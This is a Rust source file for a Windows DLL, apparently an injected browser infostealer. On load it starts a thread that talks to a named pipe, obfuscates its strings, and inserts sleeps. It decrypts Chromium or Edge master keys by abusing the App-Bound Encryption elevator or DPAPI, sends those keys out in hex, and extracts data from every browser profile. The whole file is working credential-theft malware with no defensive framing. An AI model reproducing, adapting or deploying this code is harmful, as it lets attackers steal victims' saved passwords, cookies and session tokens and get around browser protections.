include!(concat!(env!("OUT_DIR"), "/entropy.rs"));

use windows::Win32::System::SystemServices::{DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH};
use windows::Win32::System::LibraryLoader::DisableThreadLibraryCalls;
use windows::Win32::System::Threading::{CreateThread, THREAD_CREATION_FLAGS};
use windows::Win32::Foundation::{BOOL, HMODULE};
use std::ffi::c_void;
use std::ptr;
use std::path::Path;
use obfstr::obfstr;

mod pipe_client;
mod browser_config;
use pipe_client::PipeClient;
use browser_config::g_configs;
use kurion_crypto::master_key::{g_encrypted_key_by_name, g_legacy_key};
use kurion_crypto::dpapi::u_data;
use kurion_sys::com::elevator::Elevator;
use kurion_sys::sleep_obfuscation::j_sleep;
use kurion_extractor::DataExtractor;

#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    hinst_dll: HMODULE,
    reason: u32,
    _reserved: *mut c_void,
) -> BOOL {
    match reason {
        DLL_PROCESS_ATTACH => {
            unsafe { let _ = DisableThreadLibraryCalls(hinst_dll); };
            unsafe {
                let _ = CreateThread(
                    None,
                    0,
                    Some(p_thread),
                    Some(ptr::null_mut()),
                    THREAD_CREATION_FLAGS(0),
                    None,
                );
            }
        }
        DLL_PROCESS_DETACH => {}
        _ => {}
    }
    BOOL::from(true)
}

unsafe extern "system" fn p_thread(_lp_param: *mut c_void) -> u32 {
    let mut pipe = PipeClient::new();

    if let Err(_) = pipe.connect(obfstr!("\\\\.\\pipe\\interium_pipe")) {
        return 1;
    }

    match pipe.r_config() {
        Ok(config) => {
            if config.verbose {
               let _ = pipe.send(&format!("Running in {}", config.browser_type));
            }

            let configs = g_configs();
            if let Some(browser) = configs.get(&config.browser_type.to_lowercase()) {
                 j_sleep(100);

                 let local_state = browser.user_data_path.join("Local State");

                 let supports_abe = browser.clsid.to_u128() != 0;

                 let master_key_result = if supports_abe {
                     let _ = pipe.send("[*] Attempting App-Bound decryption...");
                     match g_encrypted_key_by_name(&local_state, "app_bound_encrypted_key") {
                         Ok(enc_key) => {
                             let elevator = Elevator::new();
                             match elevator.decrypt_key(
                                 &enc_key,
                                 &browser.clsid,
                                 &browser.iid,
                                 browser.iid_v2.as_ref(),
                                 browser.name == "Edge"
                             ) {
                                 Ok(key) => Ok(key),
                                 Err(_) => {
                                     let _ = pipe.send("[*] App-Bound failed, trying DPAPI...");
                                     match g_legacy_key(&local_state) {
                                         Ok(dpapi_enc) => u_data(&dpapi_enc),
                                         Err(e) => Err(e)
                                     }
                                 }
                             }
                         }
                         Err(_) => {
                             let _ = pipe.send("[*] No App-Bound key, trying DPAPI...");
                             match g_legacy_key(&local_state) {
                                 Ok(dpapi_enc) => u_data(&dpapi_enc),
                                 Err(e) => Err(e)
                             }
                         }
                     }
                 } else {
                     let _ = pipe.send("[*] Using DPAPI decryption...");
                     match g_legacy_key(&local_state) {
                         Ok(dpapi_enc) => u_data(&dpapi_enc),
                         Err(e) => Err(e)
                     }
                 };

                 match master_key_result {
                     Ok(master_key) => {
                         let _ = pipe.send(&format!("KEY:{}", hex::encode(&master_key)));

                         if browser.name == "Edge" {
                             if let Ok(aster_enc) = g_encrypted_key_by_name(&local_state, "aster_app_bound_encrypted_key") {
                                 let aster_elevator = Elevator::new();
                                 match aster_elevator.decrypt_key(
                                     &aster_enc,
                                     &browser.clsid,
                                     &browser.iid,
                                     browser.iid_v2.as_ref(),
                                     true
                                 ) {
                                     Ok(aster_key) => {
                                         let _ = pipe.send(&format!("ASTER_KEY:{}", hex::encode(&aster_key)));
                                     }
                                     Err(_) => {}
                                 }
                             }
                         }

                         let output_path = std::env::temp_dir().join("KRN");
                         let profiles = f_profiles(&browser.user_data_path);

                         if profiles.is_empty() {
                             let _ = pipe.send("[-] No profiles found to extract");
                         } else {
                             j_sleep(200);

                             let mut extractor = DataExtractor::new(master_key, output_path.clone(), &mut pipe);
                             for profile in profiles {
                                 let profile_path = browser.user_data_path.join(&profile);
                                 extractor.p_profile(&profile_path, &browser.name, &browser.engine_type);

                                 j_sleep(50);
                             }
                             drop(extractor);

                         }

                         let _ = pipe.send("DONE");
                     }
                     Err(e) => {
                         let _ = pipe.send(&format!("[-] All decryption methods failed: {}", e));
                     }
                 }

            } else {
                let _ = pipe.send(&format!("[-] Unknown browser type: {}", config.browser_type));
            }
        }
        Err(e) => {
             let _ = pipe.send(&format!("[-] Config read failed: {}", e));
        }
    }

    0
}

fn f_profiles(user_data_dir: &Path) -> Vec<String> {
    let mut profiles = Vec::new();

    if user_data_dir.join("Default").join("Preferences").exists() {
         profiles.push("Default".to_string());
    }

    if let Ok(entries) = std::fs::read_dir(user_data_dir) {
        for entry in entries.flatten() {
            if let Ok(name) = entry.file_name().into_string() {
                if name.starts_with("Profile ") {
                     if entry.path().join("Preferences").exists() {
                         profiles.push(name);
                     }
                }
            }
        }
    }

    profiles
}
